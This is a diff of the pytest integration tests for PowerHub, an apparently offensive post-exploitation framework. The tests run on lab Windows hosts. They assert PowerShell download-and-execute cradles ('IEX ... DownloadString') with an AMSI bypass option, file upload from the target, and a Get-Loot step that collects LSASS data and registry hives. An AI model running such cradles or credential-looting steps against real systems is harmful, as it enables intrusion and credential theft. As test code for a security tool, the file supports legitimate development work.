@@ -4,17 +4,17 @@
 import os
 import sys
 import time
-from subprocess import check_output
-from shlex import split
 #  import tempfile
 import re
+import random
 import requests
 
 import pytest
+import bs4
 
 # https://stackoverflow.com/a/33515264/1308830
 sys.path.append(os.path.join(os.path.dirname(__file__), 'helpers'))
-from test_init import TEST_URI, TEST_COMMANDS, init_tests  # noqa
+from test_init import TEST_URI, TEST_COMMANDS, init_tests, execute_cmd  # noqa
 
 
 MAX_TEST_MODULE_PS1 = 103
@@ -28,63 +28,55 @@ def get_stager():
     param_set = {
         'default': {
             "flavor": "hub",
-            "GroupLauncher": "powershell",
-            "GroupAmsi": "reflection",
-            "GroupTransport": "http",
-            "GroupClipExec": "none",
-            "CheckboxProxy": "false",
-            "CheckboxTLS1.2": "false",
-            "RadioFingerprint": "true",
-            "RadioNoVerification": "false",
-            "RadioCertStore": "false",
+            "Launcher": "powershell",
+            "Amsi": "reflection",
+            "Transport": "http",
+            "ClipExec": "none",
+            "Proxy": "false",
+            "TLS1.2": "false",
+            "Fingerprint": "true",
+            "NoVerification": "false",
+            "CertStore": "false",
         },
         'HTTPS': {
             "flavor": "hub",
-            "GroupLauncher": "powershell",
-            "GroupAmsi": "reflection",
-            "GroupTransport": "https",
-            "GroupClipExec": "none",
-            "CheckboxProxy": "false",
-            "CheckboxTLS1.2": "false",
-            "RadioFingerprint": "true",
-            "RadioNoVerification": "false",
-            "RadioCertStore": "false",
+            "Launcher": "powershell",
+            "Amsi": "reflection",
+            "Transport": "https",
+            "ClipExec": "none",
+            "Proxy": "false",
+            "TLS1.2": "false",
+            "Fingerprint": "true",
+            "NoVerification": "false",
+            "CertStore": "false",
         },
         'BASH': {
             "flavor": "hub",
-            "GroupLauncher": "bash",
-            "GroupAmsi": "reflection",
-            "GroupTransport": "http",
-            "GroupClipExec": "none",
-            "CheckboxProxy": "false",
-            "CheckboxTLS1.2": "false",
-            "RadioFingerprint": "true",
-            "RadioNoVerification": "false",
-            "RadioCertStore": "false",
+            "Launcher": "bash",
+            "Amsi": "reflection",
+            "Transport": "http",
+            "ClipExec": "none",
+            "Proxy": "false",
+            "TLS1.2": "false",
+            "Fingerprint": "true",
+            "NoVerification": "false",
+            "CertStore": "false",
         },
     }
     i = 0
     while i < 10:
         try:
             for k, v in param_set.items():
-                result[k] = requests.get(f"http://{TEST_URI}:{PORT}/dlcradle",
-                                         params=v).text
+                response = requests.get(f"http://{TEST_URI}:{PORT}/dlcradle",
+                                        params=v).text
+                soup = bs4.BeautifulSoup(response, features='lxml')
+                result[k] = soup.find('code').getText()
             break
         except requests.exceptions.ConnectionError:
             i += 1
             time.sleep(.5)
-    result["POWERSHELL_ESCAPED_QUOTES"] = result["default"].replace("'",
-                                                                    '\\"')
+    result["POWERSHELL_ESCAPED_QUOTES"] = result["default"].replace("'", '\\"')
     return result
-
-
-def execute_cradle(cmd):
-    env = os.environ
-    env["PYTHONIOENCODING"] = "utf8"
-    return check_output(
-        split(cmd),
-        env=env,
-    )[:-1].decode()
 
 
 def create_modules():
@@ -98,53 +90,71 @@ def create_modules():
             f.write(func % {"n": i})
 
 
-@pytest.fixture
+@pytest.fixture(scope="module")
 def full_app():
-    from powerhub import powerhub
-    from powerhub import reverseproxy
+    from powerhub.app import PowerHubApp
+    app = PowerHubApp()
+    app.run(background=True)
     create_modules()
-    powerhub.main(fully_threaded=True)
     yield get_stager()
-    reverseproxy.reactor.stop()
+    app.stop()
 
 
 def test_stager(full_app):
-    assert full_app['default'] == (
+    assert (
         "$K=New-Object Net.WebClient;IEX "
         + f"$K.DownloadString('http://{TEST_URI}:8080"
-        + "/0?t=http&f=h&a=reflection');"
-    )
-    assert full_app['HTTPS'].startswith(
+        + "/0?t=http&a=reflection');"
+    ) in (full_app['default'])
+    assert (
         "[System.Net.ServicePointManager]::ServerCertificateValidationCallback"
         + "={param($1,$2);$2.Thumbprint -eq '"
-    )
-    assert full_app['HTTPS'].endswith(
+    ) in (full_app['HTTPS'])
+    assert (
         "'};$K=New-Object Net.WebClient;IEX $K.DownloadString"
-        + f"('https://{TEST_URI}:8443/0?t=https&f=h&a=reflection');"
-    )
+        + f"('https://{TEST_URI}:8443/0?t=https&a=reflection');"
+    ) in (full_app['HTTPS'])
 
+
+@pytest.fixture(scope="module")
+def backends(full_app):
+    # win10 uses ssh
     win10cmd = TEST_COMMANDS["win10"] % full_app
     # Insert formatter for extra command
     win10cmd = win10cmd[:-2] + '%s' + win10cmd[-2:]
-    run_test_remote(lambda c: win10cmd % c.replace('"', '\\"'))
 
+    # win7 uses wmiexec
     win7cmd = TEST_COMMANDS["win7"] % full_app
     win7cmd = win7cmd.replace('\\$', '$')
     # Insert formatter for extra command
     win7cmd = win7cmd[:-3] + '%s' + win7cmd[-3:]
-    run_test_remote(lambda c: win7cmd % c.replace('"', "'"))
+
+    return {
+        "win10": lambda c: win10cmd % c.replace('"', '\\"'),
+        "win7": lambda c: win7cmd % c.replace('"', "'"),
+    }
 
 
-def run_test_remote(cmd):
-    out = execute_cradle(cmd(""))
+@pytest.fixture(scope="module", params=["win7", "win10"])
+def backend(request, backends):
+    """Parameterize backends"""
+    return backends[request.param]
+
+
+def test_start(backend):
+    out = execute_cmd(backend(""))
     assert "Adrian Vollmer" in out
     assert "Run 'Help-PowerHub' for help" in out
 
-    out = execute_cradle(cmd("lshm"))
+
+def test_list_hubmodules(backend):
+    out = execute_cmd(backend("lshm"))
     for i in range(MAX_TEST_MODULE_PS1):
         assert "psmod%d" % i in out
 
-    out = execute_cradle(cmd("lhm psmod53|fl;Invoke-Testfunc53"))
+
+def test_load_hubmodule(backend):
+    out = execute_cmd(backend("lhm psmod53|fl;Invoke-Testfunc53"))
     assert "Test53" in out
     assert "psmod53" in out
     assert re.search("Name *: ps1/psmod53.ps1\r\n", out)
@@ -152,33 +162,59 @@ def run_test_remote(cmd):
     assert re.search("N *: 72\r\n", out)
     assert re.search("Loaded *: True\r\n", out)
 
-    out = execute_cradle(
-        cmd('$p="72-74,77";lhm $p;Invoke-Testfunc53;'
-            + "Invoke-Testfunc99;Invoke-Testfunc47;Invoke-Testfunc72;")
+
+def test_load_hubmodule_range(backend):
+    out = execute_cmd(
+        backend('$p="72-74,77";lhm $p;Invoke-Testfunc53;'
+                + "Invoke-Testfunc99;Invoke-Testfunc47;Invoke-Testfunc72;")
     )
-    print(out)
     # I don't understand the order of the modules
     assert "Test53" in out
     assert "Test99" in out
     assert "Test47" in out
     assert "Test72" in out
 
+
+def test_upload(backend):
     from powerhub.directories import UPLOAD_DIR
-    testfile = "testfile.dat"
-    out = execute_cradle(
-        cmd(('$p=-join ($env:TEMP,"\\\\%s");'
-             + '[io.file]::WriteAllBytes($p,(1..255));'
-             + 'pth $p;rm $p') % testfile)
+    testfile = "testfile-%030x.dat" % random.randrange(16**30)
+    out = execute_cmd(
+        backend(('$p=Join-Path $env:TEMP "%s";'
+                 + '[io.file]::WriteAllBytes($p,(1..255));'
+                 + 'pth $p;rm $p') % testfile)
     )
     time.sleep(1)
+    assert "At line:" not in out  # "At line:" means PS error
     with open(os.path.join(UPLOAD_DIR, testfile), "rb") as f:
         data = f.read()
     assert data == bytes(range(1, 256))
 
-    out = execute_cradle(
-        cmd('$p="FooBar123";$p|pth -name %s;' % testfile)
+    out = execute_cmd(
+        backend('$p="FooBar123";$p|pth -name %s;' % testfile)
     )
     time.sleep(1)
+    assert "At line:" not in out  # "At line:" means PS error
     with open(os.path.join(UPLOAD_DIR, testfile+".1"), "rb") as f:
         data = f.read()
     assert data == b"FooBar123"
+
+
+def test_get_loot(backend):
+    from powerhub import sql
+    loot_count = len(sql.get_loot())
+    out = execute_cmd(backend('Get-Loot'))
+    assert "At line:" not in out  # "At line:" means PS error
+    #  for i in range(60):
+    #      time.sleep(1)
+    #      loot = sql.get_loot()
+    #      if (loot and loot[0].lsass and loot[0].hive and loot[0].sysinfo):
+    #          break
+    #  assert i < 59
+    loot = sql.get_loot()
+    assert loot_count + 1 == len(loot)
+    loot = loot[-1]
+    assert "Administrator" in loot.hive
+    assert "500" in loot.hive
+    assert "Microsoft Windows" in loot.sysinfo
+    assert "isadmin" in loot.sysinfo
+    assert "session_id" in loot.lsass
